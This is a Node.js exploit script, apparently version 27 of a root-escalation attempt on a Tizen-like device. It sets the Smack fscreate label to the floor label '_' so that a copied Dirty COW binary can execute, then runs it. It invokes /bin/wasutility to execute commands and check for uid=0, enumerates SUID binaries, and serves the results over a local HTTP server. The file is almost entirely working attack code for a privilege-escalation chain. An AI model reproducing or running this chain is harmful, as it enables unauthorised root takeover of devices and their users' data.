// v27 - set /proc/self/attr/fscreate to _ before writing dirtycow_was
// This labels the written file with Smack floor label (_) = exec by all
// Then run Dirty COW from /tmp, then exec wasutility
// Pull server: 8107
try {
  var fs  = require('fs');
  var cp  = require('child_process');
  var http = require('http');
  var lines = ['=== fscreate-exec v27 ==='];

  var SRC  = '/home/owner/share/tmp/sdk_tools/dirtycow_was';
  var DST  = '/tmp/dirtycow_was_v27';
  var OUT  = '/tmp/pwn27.txt';

  // Step 1: read current fscreate
  try {
    var cur = fs.readFileSync('/proc/self/attr/fscreate', 'utf8').trim();
    lines.push('fscreate_before: "' + cur + '"');
  } catch(e) { lines.push('fscreate_read: ' + String(e.code||e.message)); }

  // Step 2: write _ to fscreate so next file gets floor label
  var fscreateOK = false;
  try {
    fs.writeFileSync('/proc/self/attr/fscreate', '_');
    var after = fs.readFileSync('/proc/self/attr/fscreate', 'utf8').trim();
    lines.push('fscreate_after: "' + after + '"');
    fscreateOK = true;
  } catch(e) { lines.push('fscreate_write: ' + String(e.code||e.message)); }

  // Step 3: write dirtycow_was with floor label
  try {
    var binData = fs.readFileSync(SRC);
    fs.writeFileSync(DST, binData, {mode: 0755});
    lines.push('write_dst: OK ' + binData.length + ' bytes');
  } catch(e) { lines.push('write_dst: ' + String(e.message||e.code)); }

  // Step 4: reset fscreate to normal
  try { fs.writeFileSync('/proc/self/attr/fscreate', '\0'); } catch(e) {}

  // Step 5: verify label on written file (via getfattr if available)
  try {
    var lbl = cp.execSync('cat /proc/self/attr/fscreate 2>/dev/null || echo "no_fscreate"', {timeout:2000}).toString().trim();
    lines.push('fscreate_reset: ' + lbl);
  } catch(e) {}

  // Step 6: try execFileSync on the floor-labeled binary
  try {
    var out = cp.execFileSync(DST, [], {timeout: 5000}).toString().trim();
    lines.push('execFile_floor: OK out=' + out.substring(0, 100));
  } catch(e) {
    lines.push('execFile_floor: code=' + (e.code||'?') + ' errno=' + (e.errno||'?') +
               ' status=' + (e.status||'?') + ' msg=' + String(e.message||'').substring(0, 100));
    if (e.stderr) lines.push('  stderr: ' + e.stderr.toString().substring(0, 100));
  }

  // Step 7: also try exec via sh
  try {
    var out2 = cp.execSync(DST + ' 2>&1', {timeout: 5000}).toString().trim();
    lines.push('exec_sh: OK out=' + out2.substring(0, 100));
  } catch(e) {
    lines.push('exec_sh: ' + String(e.stderr||e.message||e.code).substring(0, 100));
  }

  // Step 8: if exec worked, run Dirty COW race with extended timeout
  var dcowSuccess = false;
  try {
    var dcowOut = cp.execSync(DST, {timeout: 60000}).toString().trim();
    lines.push('dirtycow: OK');
    lines.push('dirtycow_out: ' + dcowOut.substring(0, 200));
    dcowSuccess = true;
  } catch(e) {
    lines.push('dirtycow_full: ' + String(e.stderr||e.message||e.code).substring(0, 100));
  }

  // Step 9: if Dirty COW ran, try wasutility
  if (dcowSuccess) {
    // Probe all wasutility flags for command exec
    ['id', '/usr/bin/id'].forEach(function(cmd) {
      try {
        var r = cp.execSync('/bin/wasutility -e "' + cmd + ' > ' + OUT + '"', {timeout:5000}).toString().trim();
        lines.push('wu_e_' + cmd.replace(/\//g,'_') + ': exit0 out=' + r);
      } catch(ex) {
        lines.push('wu_e_' + cmd.replace(/\//g,'_') + ': exit' + (ex.status||'?'));
      }
    });
    try {
      var pwnResult = fs.readFileSync(OUT, 'utf8').trim();
      lines.push('pwn_result: ' + pwnResult);
      if (pwnResult.indexOf('uid=0') !== -1) lines.push('=== ROOTED ===');
    } catch(e) { lines.push('pwn_result: ' + String(e.code||e.message)); }
  }

  // Step 10: also check if we can find SUID bins differently
  try {
    var suid = cp.execSync('find /bin /sbin /usr/bin /usr/sbin -perm /4000 2>/dev/null | head -20', {timeout: 10000}).toString().trim();
    lines.push('suid_bins: ' + suid.split('\n').join(', '));
  } catch(e) {
    // try with ls
    try {
      var ls = cp.execSync('ls -la /bin/ 2>&1 | grep "^...s"', {timeout: 5000}).toString().trim();
      lines.push('suid_ls_bin: ' + ls.substring(0, 300));
    } catch(e2) {}
  }

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe27.txt', body); } catch(e3) {}
  var srv = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end(body);
  });
  srv.listen(8107, '127.0.0.1', function() {});
  srv.on('error', function(e) {});
  setInterval(function() {}, 60000);
} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe27-crash.txt', String(e.stack||e.message).substring(0, 500)); } catch(e2) {}
}
